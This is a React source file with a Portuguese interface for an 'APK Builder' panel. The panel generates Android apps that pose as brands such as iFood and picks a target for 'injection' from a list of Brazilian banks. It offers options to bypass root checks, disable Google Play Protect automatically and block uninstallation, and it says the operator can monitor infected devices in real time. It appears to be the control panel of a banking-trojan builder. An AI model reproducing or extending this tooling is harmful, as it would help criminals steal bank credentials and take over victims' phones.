import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Progress } from "@/components/ui/progress";
import { AlertCircle, CheckCircle2, Download, Hammer, Smartphone, Trash2 } from "lucide-react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { generateInstallLink, shareLink } from "@/lib/install-link";

export function APKBuilder() {
  const [appName, setAppName] = useState("iFood");
  const [appUrl, setAppUrl] = useState("https://www.ifood.com.br/");
  const [logoUrl, setLogoUrl] = useState("");
  const [protectFromUninstall, setProtectFromUninstall] = useState(true);
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  
  // Novos campos
  const [bypassRoot, setBypassRoot] = useState(true);
  const [desinstalarPlayProtect, setDesinstalarPlayProtect] = useState(true);
  const [versionName, setVersionName] = useState("1.0.0");
  const [versionCode, setVersionCode] = useState("1");
  const [pais, setPais] = useState("Brasil");
  const [banco, setBanco] = useState("Banco do Brasil");
  const [origemLink, setOrigemLink] = useState("Automatico");

  const buildMutation = trpc.apk.build.useMutation();
  const listQuery = trpc.apk.list.useQuery(undefined, {
    refetchInterval: 2000, // Recarregar a cada 2 segundos
  });
  const clearHistoryMutation = trpc.apk.clearHistory.useMutation();

  const handleBuild = async () => {
    if (!appName.trim()) {
      toast.error("Nome do app é obrigatório");
      return;
    }

    if (!appUrl.trim()) {
      toast.error("URL do app é obrigatória");
      return;
    }

    setIsBuilding(true);
    setBuildProgress(0);

    let progressInterval: ReturnType<typeof setInterval> | null = null;

    try {
      // Simular progresso
      progressInterval = setInterval(() => {
        setBuildProgress((prev) => {
          if (prev >= 90) return prev;
          return prev + Math.random() * 20;
        });
      }, 500);

      const result = await buildMutation.mutateAsync({
        appName,
        appUrl,
        logoUrl: logoUrl || undefined,
        protectFromUninstall,
        bypassRoot,
        desinstalarPlayProtect,
        versionName,
        versionCode: parseInt(versionCode),
        pais,
        banco,
        origemLink,
      });

      if (progressInterval) clearInterval(progressInterval);
      setBuildProgress(100);

      toast.success("APK em construção - Seu APK está sendo gerado. Você receberá o link em breve!");

      // Polling para recarregar lista até o APK estar pronto
      let isReady = false;
      let attempts = 0;
      const maxAttempts = 60;
      
      while (!isReady && attempts < maxAttempts) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Refetch retorna o resultado diretamente
        const refetchResult = await listQuery.refetch();
        const builds = refetchResult.data || [];
        const latestBuild = builds[builds.length - 1];
        
        // Verificar se o build mais recente é o que acabamos de criar
        if (latestBuild && 
            latestBuild.appName === appName && 
            latestBuild.status === 'success' && 
            latestBuild.fileSize) {
          isReady = true;
        }
        
        attempts++;
      }

      setIsBuilding(false);
      setBuildProgress(0);
    } catch (error) {
      console.error("Erro ao gerar APK:", error);
      toast.error("Erro ao gerar APK");
      setIsBuilding(false);
      setBuildProgress(0);
    } finally {
      if (progressInterval) clearInterval(progressInterval);
    }
  };

  const builds = listQuery.data || [];

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 p-6">
      <div className="max-w-6xl mx-auto space-y-6">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-white mb-2 flex items-center gap-3">
            <Hammer className="w-8 h-8 text-cyan-400" />
            APK Builder
          </h1>
          <p className="text-gray-400">Crie APKs customizados para seu negócio</p>
        </div>

        {/* Configuração */}
        <Card className="bg-slate-800 border-slate-700">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Smartphone className="w-5 h-5 text-cyan-400" />
              Configuração
            </CardTitle>
            <CardDescription>Personalize seu APK</CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Nome do App */}
            <div>
              <Label htmlFor="appName" className="text-gray-300 mb-2 block">
                Nome do App *
              </Label>
              <Input
                id="appName"
                value={appName}
                onChange={(e) => setAppName(e.target.value)}
                placeholder="Ex: iFood"
                disabled={isBuilding}
                className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
              />
              <p className="text-xs text-gray-500 mt-1">Aparecerá no ícone do app</p>
            </div>

            {/* URL do App */}
            <div>
              <Label htmlFor="appUrl" className="text-gray-300 mb-2 block">
                URL do App *
              </Label>
              <Input
                id="appUrl"
                value={appUrl}
                onChange={(e) => setAppUrl(e.target.value)}
                placeholder="https://www.ifood.com.br/"
                disabled={isBuilding}
                className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
              />
              <p className="text-xs text-gray-500 mt-1">Se não começar com http/https, adicionamos https:// automaticamente.</p>
            </div>

            {/* Logo do App */}
            <div>
              <Label htmlFor="logo" className="text-gray-300 mb-2 block">
                Logo do App (URL)
              </Label>
              <Input
                id="logo"
                value={logoUrl}
                onChange={(e) => setLogoUrl(e.target.value)}
                placeholder="https://via.placeholder.com/150"
                disabled={isBuilding}
                className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
              />
              <p className="text-xs text-gray-500 mt-1">Opcional - Logo no ícone do app</p>
            </div>

            {/* Version Name e Version Code */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label htmlFor="versionName" className="text-gray-300 mb-2 block">
                  Version Name
                </Label>
                <Input
                  id="versionName"
                  value={versionName}
                  onChange={(e) => setVersionName(e.target.value)}
                  placeholder="1.0.0"
                  disabled={isBuilding}
                  className="bg-slate-700 border-slate-600 text-white"
                />
              </div>
              <div>
                <Label htmlFor="versionCode" className="text-gray-300 mb-2 block">
                  Version Code
                </Label>
                <Input
                  id="versionCode"
                  type="number"
                  value={versionCode}
                  onChange={(e) => setVersionCode(e.target.value)}
                  placeholder="1"
                  disabled={isBuilding}
                  className="bg-slate-700 border-slate-600 text-white"
                />
              </div>
            </div>

            {/* País e Banco */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label htmlFor="pais" className="text-gray-300 mb-2 block">
                  País
                </Label>
              <select
                id="pais"
                value={pais}
                onChange={(e) => setPais(e.target.value)}
                disabled={isBuilding}
                className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
              >
                  <option>Alemanha</option>
                  <option>Argentina</option>
                  <option>Brasil</option>
                  <option>Chile</option>
                  <option>Colômbia</option>
                  <option>Espanha</option>
                  <option>Estados Unidos</option>
                  <option>França</option>
                  <option>México</option>
                  <option>Peru</option>
                  <option>Portugal</option>
                  <option>Reino Unido</option>
                </select>
              </div>
              <div>
                <Label htmlFor="banco" className="text-gray-300 mb-2 block">
                  Banco para Injeção
                </Label>
              <select
                id="banco"
                value={banco}
                onChange={(e) => setBanco(e.target.value)}
                disabled={isBuilding}
                className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
              >
                  <option>Banco do Brasil</option>
                  <option>Caixa Econômica Federal</option>
                  <option>Itaú Unibanco</option>
                  <option>Banco Bradesco</option>
                  <option>Banco Santander Brasil</option>
                  <option>Nubank</option>
                  <option>Banco Inter</option>
                  <option>C6 Bank</option>
                  <option>PicPay</option>
                  <option>Banco Safra</option>
                  <option>Banco Votorantim</option>
                  <option>Banco Original</option>
                  <option>Banco Neon</option>
                  <option>Banco Mercantil</option>
                  <option>HSBC Brasil</option>
                  <option>Scotiabank Brasil</option>
                  <option>Sicredi</option>
                  <option>Sicoob</option>
                  <option>Banrisul</option>
                  <option>Banese</option>
                </select>
              </div>
            </div>

            {/* Origem do Link APK */}
            <div>
              <Label htmlFor="origemLink" className="text-gray-300 mb-2 block">
                Origem do Link APK
              </Label>
              <select
                id="origemLink"
                value={origemLink}
                onChange={(e) => setOrigemLink(e.target.value)}
                disabled={isBuilding}
                className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
              >
                <option>Automatico (EAS -&gt; Storage -&gt; Local)</option>
                <option>EAS</option>
                <option>Storage</option>
                <option>Local</option>
              </select>
            </div>

            {/* Checkboxes */}
            <div className="space-y-3 pt-4 border-t border-slate-700">
              <div className="flex items-center space-x-2">
                <Checkbox
                  id="bypassRoot"
                  checked={bypassRoot}
                  onCheckedChange={(checked) => setBypassRoot(checked as boolean)}
                  disabled={isBuilding}
                />
                <Label htmlFor="bypassRoot" className="text-gray-300 cursor-pointer">
                  ✓ Bypass Root Completo
                </Label>
              </div>
              <p className="text-xs text-gray-500 ml-6">Permite execução em dispositivos com root</p>

              <div className="flex items-center space-x-2 pt-2">
                <Checkbox
                  id="desinstalarPlayProtect"
                  checked={desinstalarPlayProtect}
                  onCheckedChange={(checked) => setDesinstalarPlayProtect(checked as boolean)}
                  disabled={isBuilding}
                />
                <Label htmlFor="desinstalarPlayProtect" className="text-gray-300 cursor-pointer">
                  ✓ Desinstalar Play Protect Automaticamente
                </Label>
              </div>
              <p className="text-xs text-gray-500 ml-6">Remove proteção do Google Play automaticamente</p>

              <div className="flex items-center space-x-2 pt-2">
                <Checkbox
                  id="protect"
                  checked={protectFromUninstall}
                  onCheckedChange={(checked) => setProtectFromUninstall(checked as boolean)}
                  disabled={isBuilding}
                />
                <Label htmlFor="protect" className="text-gray-300 cursor-pointer">
                  ✓ Proteção contra desinstalação
                </Label>
              </div>
            </div>

            {/* Barra de progresso */}
            {isBuilding && (
              <div className="space-y-2 pt-4">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-400">Gerando APK...</span>
                  <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
                </div>
                <Progress value={buildProgress} className="h-2" />
              </div>
            )}

            {/* Botão de Gerar */}
            <Button
              onClick={handleBuild}
              disabled={isBuilding}
              className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-semibold py-3 rounded-lg transition-all"
            >
              {isBuilding ? (
                <>
                  <div className="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
                  Gerando APK...
                </>
              ) : (
                <>
                  <Download className="w-4 h-4 mr-2" />
                  Gerar APK
                </>
              )}
            </Button>
          </CardContent>
        </Card>

        {/* Como funciona */}
        <Card className="bg-slate-800 border-slate-700">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <AlertCircle className="w-5 h-5 text-cyan-400" />
              Como funciona:
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3 text-sm text-gray-300">
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>APK abre uma URL em WebView</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Cliente instala normalmente</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Dispositivo aparece no painel</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Você monitora em tempo real</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Bypass Root Completo</p>
            </div>
            <div className="flex gap-3">
              <div className="w-6 h-6 bg-cyan-500 rounded-full flex items-center justify-center text-white flex-shrink-0 text-xs font-bold">
                ✓
              </div>
              <p>Desinstala Play Protect Automaticamente</p>
            </div>
          </CardContent>
        </Card>

        {/* Histórico de Builds */}
        {builds.length > 0 && (
          <Card className="bg-slate-800 border-slate-700">
            <CardHeader className="flex flex-row items-center justify-between">
              <CardTitle>Histórico de Builds</CardTitle>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => clearHistoryMutation.mutate()}
                className="text-red-400 hover:text-red-300 hover:bg-red-900/20"
              >
                <Trash2 className="w-4 h-4 mr-2" />
                Limpar
              </Button>
            </CardHeader>
            <CardContent>
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {builds.map((build) => (
                  <div
                    key={build.id}
                    className="flex items-center justify-between p-3 bg-slate-700/50 rounded border border-slate-600 hover:border-slate-500 transition-colors"
                  >
                    <div className="flex-1">
                      <p className="font-medium text-white">{build.appName}</p>
                      <p className="text-xs text-gray-400">{build.filename}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-xs text-gray-400">
                        {build.fileSize ? (
                          build.fileSize < 1024 * 1024
                            ? `${(build.fileSize / 1024).toFixed(2)}KB`
                            : `${(build.fileSize / 1024 / 1024).toFixed(2)}MB`
                        ) : (
                          "Processando..."
                        )}
                      </p>
                      <p
                        className={`text-xs font-semibold ${
                          build.status === "success"
                            ? "text-green-400"
                            : build.status === "building"
                            ? "text-yellow-400"
                            : "text-red-400"
                        }`}
                      >
                        {build.status === "success"
                          ? "✓ Pronto"
                          : build.status === "building"
                          ? "⏳ Gerando"
                          : "✗ Erro"}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}
